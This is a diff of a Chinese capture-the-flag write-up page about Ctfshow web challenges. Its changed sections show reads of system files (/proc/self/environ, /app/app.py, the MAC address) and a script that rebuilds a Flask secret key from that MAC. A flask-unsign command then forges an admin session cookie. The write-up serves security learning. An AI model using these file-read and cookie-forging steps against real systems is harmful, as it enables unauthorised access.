@@ -8,7 +8,7 @@
 <svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
 <span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#说在前面>说在前面</a></li><li><a href=#base64编码隐藏>Base64编码隐藏</a></li><li><a href=#http头注入>HTTP头注入</a></li><li><a href=#base64多层嵌套解码>Base64多层嵌套解码</a></li><li><a href=#https中间人攻击>HTTPS中间人攻击</a></li><li><a href=#cookie伪造>Cookie伪造</a></li><li><a href=#一句话木马变形>一句话木马变形</a></li><li><a href=#反弹shell构造>反弹shell构造</a></li><li><a href=#管道符绕过过滤>管道符绕过过滤</a></li><li><a href=#无字母数字代码执行>无字母数字代码执行</a></li><li><a href=#无字母数字命令执行>无字母数字命令执行</a></li><li><a href=#日志文件包含>日志文件包含</a></li><li><a href=#phpfilter读取源码>php://filter读取源码</a></li><li><a href=#远程文件包含rfi>远程文件包含（RFI）</a></li><li><a href=#路径遍历突破>路径遍历突破</a></li><li><a href=#临时文件包含>临时文件包含</a></li><li><a href=#session固定攻击>Session固定攻击</a></li><li><a href=#jwt令牌伪造>JWT令牌伪造</a></li><li><a href=#flask_session伪造>Flask_Session伪造</a></li><li><a href=#弱口令爆破>弱口令爆破</a></li><li><a href=#联合查询注入>联合查询注入</a></li><li><a href=#布尔盲注爆破>布尔盲注爆破</a></li><li><a href=#堆叠注入写shell>堆叠注入写Shell</a></li><li><a href=#waf绕过>WAF绕过</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/ctfshow/>Ctfshow</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/ctfshow-web-security-defense/>Ctfshow中Web应用安全与防护</a></h2><h3 class=article-subtitle>六六六，个个都是极客少年</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
 <time class=article-time--published>Sep 03, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
-<time class=article-time--reading>11 minute read</time></div></footer></div></header><section class=article-content><h2 id=说在前面>说在前面</h2><p>“啊？还是难了吗，这个是面向高三学生的”</p><h2 id=base64编码隐藏>Base64编码隐藏</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+<time class=article-time--reading>12 minute read</time></div></footer></div></header><section class=article-content><h2 id=说在前面>说在前面</h2><p>“啊？还是难了吗，这个是面向高三学生的”</p><h2 id=base64编码隐藏>Base64编码隐藏</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -318,7 +318,7 @@
 </span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
 </span></span><span class=line><span class=cl>    <span class=n>pw</span> <span class=o>=</span> <span class=n>recover_one_password</span><span class=p>()</span>
 </span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] 找到可用口令：&#34;</span><span class=p>,</span> <span class=n>pw</span><span class=p>)</span>
-</span></span></code></pre></td></tr></table></div></div><h2 id=https中间人攻击>HTTPS中间人攻击</h2><h2 id=cookie伪造>Cookie伪造</h2><p><code>guest\guest</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></span></code></pre></td></tr></table></div></div><h2 id=https中间人攻击>HTTPS中间人攻击</h2><p>GPT一把锁，flag在TLS握手协议解密之后可以拿到</p><h2 id=cookie伪造>Cookie伪造</h2><p><code>guest\guest</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -630,7 +630,7 @@
 </span></span><span class=line><span class=cl>
 </span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>30</span><span class=p>):</span>
 </span></span><span class=line><span class=cl>            <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>read</span><span class=p>,</span><span class=n>args</span><span class=o>=</span><span class=p>(</span><span class=n>sess</span><span class=p>,))</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
-</span></span></code></pre></td></tr></table></div></div><p>但是呢，并没有成功</p><h2 id=session固定攻击>Session固定攻击</h2><p>登陆普通用户之后发送message给admin，返回包里面的sessionid保存下来，换了回到首页就有flag</p><h2 id=jwt令牌伪造>JWT令牌伪造</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></span></code></pre></td></tr></table></div></div><h2 id=session固定攻击>Session固定攻击</h2><p>登陆普通用户之后发送message给admin，返回包里面的sessionid保存下来，换了回到首页就有flag</p><h2 id=jwt令牌伪造>JWT令牌伪造</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -678,8 +678,126 @@
 </span></span><span class=line><span class=cl>flask-unsign --unsign --cookie <span class=s1>&#39;eyJ1c2VybmFtZSI6Imd1ZXN0In0.aLkwlQ.F1sLIJN3BXxha-9X5QBg3Mo8a9w&#39;</span>
 </span></span></code></pre></td></tr></table></div></div><p>需要找key，可以任意文件读取</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/proc/self/environ
-</span></span><span class=line><span class=cl><span class=nv>HOSTNAME</span><span class=o>=</span>8bbcad412db1
+</span></span><span class=line><span class=cl>/proc/self/cmdline
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/app/app.py
+</span></span></code></pre></td></tr></table></div></div><p>读到文件的时候我以为结束了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># encoding: utf-8</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>uuid</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.request</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>session</span><span class=p>,</span> <span class=n>request</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>random</span><span class=o>.</span><span class=n>seed</span><span class=p>(</span><span class=n>uuid</span><span class=o>.</span><span class=n>getnode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;SECRET_KEY&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>random</span><span class=p>()</span> <span class=o>*</span> <span class=mi>100</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;SECRET_KEY&#39;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>debug</span> <span class=o>=</span> <span class=kc>False</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>session</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;guest&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;CTFshow 网页爬虫系统 读取网页&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/read&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>read</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>url</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;url&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=s1>&#39;flag&#39;</span><span class=p>,</span> <span class=n>url</span><span class=p>,</span> <span class=n>re</span><span class=o>.</span><span class=n>IGNORECASE</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s1>&#39;禁止访问&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=n>res</span> <span class=o>=</span> <span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>urlopen</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>res</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s1>&#39;ignore&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>ex</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>ex</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;无读取内容可以展示&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/flag&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>flag</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>session</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;username&#39;</span><span class=p>)</span> <span class=o>==</span> <span class=s1>&#39;admin&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;/flag.txt&#39;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;访问受限&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>        <span class=n>debug</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=n>host</span><span class=o>=</span><span class=s2>&#34;0.0.0.0&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>不过他是根据Mac地址伪随机生成的，所以是能够爆破的，但是后来想起来了更好的方法</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/sys/class/net/eth0/address
+</span></span><span class=line><span class=cl>02:42:ac:0c:00:a4
+</span></span></code></pre></td></tr></table></div></div><p>计算出来之后直接伪造</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>mac</span> <span class=o>=</span> <span class=s2>&#34;02:42:ac:0c:00:a4&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>mac_int</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>mac</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>random</span><span class=o>.</span><span class=n>seed</span><span class=p>(</span><span class=n>mac_int</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>secret_key</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>random</span><span class=p>()</span> <span class=o>*</span> <span class=mi>100</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;SECRET_KEY:&#34;</span><span class=p>,</span> <span class=n>secret_key</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>39.76950030416043
+</span></span></span><span class=line><span class=cl><span class=s2>flask-unsign --sign --cookie &#34;{&#39;username&#39;: &#39;admin&#39;}&#34; --secret 39.76950030416043 --no-literal-eval
+</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
 </span></span></code></pre></td></tr></table></div></div><h2 id=弱口令爆破>弱口令爆破</h2><p>直接爆破就好了，字典都给了</p><h2 id=联合查询注入>联合查询注入</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
